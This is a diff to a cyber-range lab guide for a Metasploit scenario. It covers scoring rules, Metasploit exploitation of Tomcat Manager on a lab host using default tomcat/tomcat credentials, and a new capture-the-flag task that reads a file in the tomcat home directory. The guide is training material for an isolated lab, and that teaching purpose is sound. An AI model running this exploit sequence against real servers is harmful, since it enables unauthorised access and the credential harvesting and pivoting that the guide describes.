@@ -40,12 +40,14 @@ What's a "port"? A single machine runs many services at once (web, SSH, FTP…).
 
 ## 2. How scoring works (read this, it's the #1 source of confusion)
 
-The scorer **does not watch your screen**. After each task it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live.
+The scorer **does not watch your screen**. For Tasks 1–4 it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live. Task 5 is different — it is scored by the **flag you submit** (see Task 5).
 
-Two habits that make scoring reliable **1.** After a command succeeds, press **Enter** once (this flushes it to history), then click **Manual Check** for that task in the portal.  
-**2.** Stay in the **Kali** tab. Commands run from the Meta tab or a desktop GUI won't be in the history the scorer reads. 
+Two habits that make scoring reliable **1.** After a command succeeds, press **Enter** once (this flushes it to history). Scoring is automatic within a few seconds; you usually don't need to do anything.  
+**2.** Stay in the **Kali Linux (CLI)** tab — it's the only terminal this scenario uses. 
 
-**Points:** the four milestones total the scenario's score. You clear a milestone when its Manual Check turns to PASS.
+**About Manual Check (Tasks 1–4):** only use it if you finished a task and it was *not* detected automatically. You get **one** Manual Check per task. If that check still can't verify your work, the task moves to **instructor review** (the button is replaced by "Ask an instructor to check") — it does not keep retrying, and no points are given until an instructor approves.
+
+**Points:** the five milestones total the scenario's score. Tasks 1–4 clear when auto-detect or a Manual Check turns to PASS; Task 5 clears when you submit the correct flag.
 
 ---
 
@@ -70,7 +72,7 @@ Part | What it means
 
 What you can do with this You now have a live-host map of your subnet, that's your **scope**. From here you stop scanning the whole `/24` and focus on the box worth attacking: **Meta ($TARGET_META)**. Everything downstream targets that host. 
 
-If something's off Subnet variable empty? Run `echo $TARGET_SUBNET` or read the IP strip in the lab header. No replies at all? Make sure you're in the **Kali** tab, not the Meta tab. 
+If something's off Subnet variable empty? Run `echo $TARGET_SUBNET` or read the IP strip in the lab header. No replies at all? Make sure you are typing in the **Kali Linux (CLI)** tab. 
 
 
 ### Task 2: find the open doors on Meta
@@ -156,29 +158,32 @@ msfconsole -q
 > 2. `set PATH /manager/text`  
 > 3. `set TARGET 1` (must be set **before** `run`)
 
-Copy/paste **one line at a time**:
+**Run these inside `msfconsole`, one command at a time, in this order.** Each
+block has its own Copy button — copy, paste, press Enter, then move to the next.
+Do **not** paste them all at once.
 
 ```bash
 use exploit/multi/http/tomcat_mgr_deploy
-set RHOSTS $TARGET_META
-set RPORT 8180
-set HttpUsername tomcat
-set HttpPassword tomcat
-set PATH /manager/text
-set TARGET 1
-run
 ```
-
-Verified working shape (lab slot 1 example, use **your** Meta IP):
-
 ```bash
-use exploit/multi/http/tomcat_mgr_deploy
-set RHOSTS 10.0.51.20
+set RHOSTS $TARGET_META
+```
+```bash
 set RPORT 8180
+```
+```bash
 set HttpUsername tomcat
+```
+```bash
 set HttpPassword tomcat
+```
+```bash
 set PATH /manager/text
+```
+```bash
 set TARGET 1
+```
+```bash
 run
 ```
 
@@ -219,6 +224,44 @@ exit
 
 > **What you can do with this:** You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the lab network. This shell is the launch point for the rest of an engagement. 
 
+
+### Task 5: capture the flag (whoami)
+
+**Goal:** prove you have the shell by reading the flag that only the `tomcat`
+user can see, then submit it in the portal.
+
+> **What you're doing & why:** A real engagement records *proof* of access, not
+> just "it worked." Here the proof is a **flag** — a unique string placed in the
+> `tomcat` user's home directory. Reading it confirms your foothold; submitting
+> it is how this task is scored.
+
+**Which tool:** the Metasploit session (or a plain shell) from Task 4, on **Meta**.
+
+#### Step 1 — confirm who you are
+```bash
+whoami
+```
+You should see `tomcat`. If you see something else, you are not in the shell from
+Task 4 — redo Task 4 first.
+
+#### Step 2 — read the flag
+```bash
+cat /home/tomcat/whoami_flag.txt
+```
+The line ends with a value in the form `FLAG{...}`.
+
+#### Step 3 — submit the flag
+
+Open the **Tasks** panel on the right, find **Capture the Flag (whoami)**, paste
+the `FLAG{...}` value into **Submit the flag you found**, and click **Submit**.
+
+- **Correct flag → the task is marked complete and the points are awarded.**
+- **Wrong flag → no points, with a message to check it and try again.** Your flag
+  is unique to you, so copy it exactly (including `FLAG{` and `}`).
+
+**How it's scored:** by the flag you submit — there is no Manual Check for this
+task.
+
 ---
 ## 3. Recon playground (explore, not scored)
 
@@ -244,5 +287,5 @@ Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sur
 No route / host down | Confirm the lab is **ACTIVE** ; use the exact IPs from your lab header.  
 `Exploit completed, but no session was created` | Almost always missing **`set TARGET 1`** before `run`, or `set RHOSTS` was the literal text `$TARGET_META` instead of digits. Fix both, `run` again.  
 Tomcat exploit fails / no shell | History must show **`set PATH /manager/text`**, **`set TARGET 1`**, `RPORT 8180`, creds `tomcat`/`tomcat`, and a numeric Meta IP on `RHOSTS`.  
-Wrong tab | Tasks 1–4 all run from **Kali** , never the Meta tab.  
+Wrong tab | Every command runs from the **Kali Linux (CLI)** tab.  
 Guide still shows `msf6 >` / `search tomcat` / no `TARGET 1` | Hard-refresh the Guide panel; on the host confirm `grep TARGET ~/cyberrange/portal/public/scenarios/scenario_01_network_reconnaissance.md` includes `set TARGET 1`.  
